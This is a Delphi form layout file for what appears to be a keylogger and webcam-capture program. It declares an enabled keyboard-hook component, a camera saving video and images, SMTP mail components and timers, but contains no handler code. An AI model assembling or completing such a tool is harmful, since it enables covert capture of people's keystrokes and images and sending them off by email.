object Form1: TForm1
  Left = 215
  Top = 51
  Width = 1255
  Height = 744
  Caption = 'Form1'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object Memo1: TMemo
    Left = 88
    Top = 16
    Width = 177
    Height = 169
    Lines.Strings = (
      'Keylogos')
    TabOrder = 0
  end
  object Camera1: TCamera
    Left = 336
    Top = 8
    Width = 865
    Height = 705
    FichierVideo = 'Video.avi'
    FichierImage = 'Imagen.bmp'
  end
  object KeySpyXP1: TKeySpyXP
    Author = 'n_a_v_'
    Enabled = True
    KeyWord.Keyword_Input_Type = KitOneAfterAnother
    KeyWord.Caps_Lock = KbsDontCare
    KeyWord.Num_Lock = KbsDontCare
    KeyWord.Scroll_Lock = KbsDontCare
    OnKey = KeySpyXP1Key
    Left = 32
    Top = 16
  end
  object Timer1: TTimer
    OnTimer = Timer1Timer
    Left = 32
    Top = 56
  end
  object OpenDialog1: TOpenDialog
    Left = 32
    Top = 96
  end
  object SaveDialog1: TSaveDialog
    Left = 32
    Top = 136
  end
  object XPManifest1: TXPManifest
    Left = 296
    Top = 16
  end
  object IdMessage1: TIdMessage
    AttachmentEncoding = 'MIME'
    BccList = <>
    CCList = <>
    Encoding = meMIME
    Recipients = <>
    ReplyTo = <>
    Left = 304
    Top = 120
  end
  object IdSMTP1: TIdSMTP
    MaxLineAction = maException
    ReadTimeout = 0
    Port = 25
    AuthenticationType = atLogin
    Left = 280
    Top = 88
  end
  object Timer2: TTimer
    Interval = 10000
    OnTimer = Timer2Timer
    Left = 304
    Top = 232
  end
end
